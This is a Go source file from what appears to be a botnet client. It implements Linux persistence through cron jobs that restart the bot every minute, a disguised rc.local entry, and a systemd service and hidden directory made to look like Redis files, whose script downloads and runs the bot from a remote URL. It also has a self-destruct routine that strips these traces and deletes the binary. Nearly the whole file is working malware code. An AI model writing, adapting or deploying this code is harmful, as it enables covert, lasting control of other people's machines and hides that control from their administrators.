package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// ============================================================================
// PERSISTENCE FUNCTIONS
// These establish various methods to survive reboots and maintain access.
// ============================================================================

// carbanak creates a cron job that runs every minute to check/restart the bot.
// The cron job executes the persistence shell script inside hiddenDir.
// In debug mode: only logs what would happen, does not execute.
// Parameters:
//   - hiddenDir: Directory containing the persistence script
func carbanak(hiddenDir string) {
	scriptPath := filepath.Join(hiddenDir, scriptLabel)
	cronJob := fmt.Sprintf("%s bash %s > /dev/null 2>&1", schedExpr, scriptPath)

	if verboseLog {
		deoxys("carbanak: [DEBUG] Would set up cron persistence in %s", hiddenDir)
		deoxys("carbanak: [DEBUG] Would install cron job: %s", cronJob)
		deoxys("carbanak: [DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	cmd := exec.Command(bashBin, shellFlag, fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
	if err := cmd.Run(); err != nil {
		deoxys("carbanak: crontab install failed: %v", err)
	}
}

// lazarus sets up a simple cron job to keep the bot running.
// Runs every minute to check if bot is alive and restart if needed.
// Does not require any external scripts - directly executes the binary.
// In debug mode: only logs what would happen, does not execute.
func lazarus() {
	exe, err := os.Executable()
	if err != nil {
		if verboseLog {
			deoxys("lazarus: [DEBUG] Failed to get executable path: %v", err)
		}
		return
	}

	procName := filepath.Base(exe)
	cronJob := fmt.Sprintf("%s pgrep -x %s > /dev/null || %s > /dev/null 2>&1 &", schedExpr, procName, exe)

	if verboseLog {
		deoxys("lazarus: [DEBUG] Would set up cron persistence")
		deoxys("lazarus: [DEBUG] Executable: %s", exe)
		deoxys("lazarus: [DEBUG] Process name: %s", procName)
		deoxys("lazarus: [DEBUG] Would install cron job: %s", cronJob)
		deoxys("lazarus: [DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	// Check if cron job already exists
	checkCmd := exec.Command(crontabBin, "-l")
	existing, _ := checkCmd.Output()
	if strings.Contains(string(existing), exe) {
		return
	}

	// Add to crontab
	cmd := exec.Command(bashBin, shellFlag, fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
	if err := cmd.Run(); err != nil {
		deoxys("lazarus: crontab install failed: %v", err)
	}
}

// fin7 adds the bot executable to rc.local for startup persistence.
// Only adds entry if rc.local exists and doesn't already contain our path.
// Uses a random suffix to make the entry less obvious.
// In debug mode: only logs what would happen, does not execute.
func fin7() {
	if verboseLog {
		deoxys("fin7: [DEBUG] Would set up rc.local persistence")
		if _, err := os.Stat(rcTarget); err != nil {
			deoxys("fin7: [DEBUG] %s does not exist, would skip", rcTarget)
			return
		}
		exe, err := os.Executable()
		if err != nil {
			deoxys("fin7: [DEBUG] Failed to get executable path: %v", err)
			return
		}
		b, err := os.ReadFile(rcTarget)
		if err != nil {
			deoxys("fin7: [DEBUG] Failed to read %s: %v", rcTarget, err)
			return
		}
		if strings.Contains(string(b), exe) {
			deoxys("fin7: [DEBUG] Entry already exists in rc.local")
			return
		}
		line := exe + " # " + kimsuky()
		deoxys("fin7: [DEBUG] Would add to rc.local: %s", line)
		deoxys("fin7: [DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	if _, err := os.Stat(rcTarget); err != nil {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	b, err := os.ReadFile(rcTarget)
	if err != nil {
		return
	}
	if strings.Contains(string(b), exe) {
		return
	}
	line := exe + " # " + kimsuky() + "\n"
	sandworm(rcTarget, line, 0700)
}

// dragonfly sets up comprehensive persistence using multiple methods:
//  1. Creates hidden directory (storeDir)
//  2. Writes a shell script that downloads/runs the bot
//  3. Creates a systemd service for automatic startup
//  4. Installs a cron job as backup persistence
//
// All files are disguised as Redis-related system files.
// In debug mode: only logs what would happen, does not execute.
func dragonfly() {
	scriptPath := filepath.Join(storeDir, scriptLabel)
	programPath := filepath.Join(storeDir, binLabel)

	if verboseLog {
		deoxys("dragonfly: [DEBUG] Would set up comprehensive persistence")
		deoxys("dragonfly: [DEBUG] Would create hidden directory: %s", storeDir)
		deoxys("dragonfly: [DEBUG] Would write persistence script to: %s", scriptPath)
		deoxys("dragonfly: [DEBUG] Script would download from: %s", fetchURL)
		deoxys("dragonfly: [DEBUG] Would write program to: %s", programPath)
		deoxys("dragonfly: [DEBUG] Would write systemd service to: %s", unitPath)
		deoxys("dragonfly: [DEBUG] Would enable systemd service: %s", unitName)
		deoxys("dragonfly: [DEBUG] Would set up cron backup via carbanak()")
		deoxys("dragonfly: [DEBUG] Skipping actual execution (debug mode)")
		return
	}

	// Production mode - execute silently
	os.MkdirAll(storeDir, 0755)

	scriptContent := fmt.Sprintf(tmplBody, fetchURL, programPath, binLabel)
	os.WriteFile(scriptPath, []byte(scriptContent), 0755)
	os.WriteFile(unitPath, []byte(unitBody), 0644)

	cmd := exec.Command(systemctlBin, "enable", "--now", unitName)
	if err := cmd.Run(); err != nil {
		deoxys("dragonfly: systemctl enable failed: %v", err)
	}

	carbanak(storeDir)
}

// nukeAndExit strips all persistence artifacts, removes the binary, and exits.
// Designed to fully remove a signal-ignoring, persisted daemon.
func nukeAndExit() {
	deoxys("nukeAndExit: Removing all persistence and self-destructing")

	// 1. Stop and remove systemd service
	exec.Command(systemctlBin, "stop", unitName).Run()
	exec.Command(systemctlBin, "disable", unitName).Run()
	os.Remove(unitPath)
	exec.Command(systemctlBin, "daemon-reload").Run()

	// 2. Remove cron entries referencing our script or binary
	if out, err := exec.Command(crontabBin, "-l").Output(); err == nil {
		lines := strings.Split(string(out), "\n")
		var clean []string
		for _, line := range lines {
			if strings.Contains(line, scriptLabel) || strings.Contains(line, binLabel) {
				continue
			}
			clean = append(clean, line)
		}
		filtered := strings.TrimSpace(strings.Join(clean, "\n"))
		if filtered == "" {
			exec.Command(crontabBin, "-r").Run()
		} else {
			cmd := exec.Command(crontabBin, "-")
			cmd.Stdin = strings.NewReader(filtered + "\n")
			cmd.Run()
		}
	}

	// 3. Clean rc.local
	rcLocal := rcTarget
	if data, err := os.ReadFile(rcLocal); err == nil {
		lines := strings.Split(string(data), "\n")
		var clean []string
		for _, line := range lines {
			if strings.Contains(line, binLabel) || strings.Contains(line, storeDir) {
				continue
			}
			clean = append(clean, line)
		}
		os.WriteFile(rcLocal, []byte(strings.Join(clean, "\n")), 0755)
	}

	// 4. Remove hidden directory (contains script + binary copy)
	os.RemoveAll(storeDir)

	// 5. Remove instance lock file
	os.Remove(lockLoc)

	// 6. Remove own executable
	if exe, err := os.Executable(); err == nil {
		os.Remove(exe)
	}

	os.Exit(0)
}
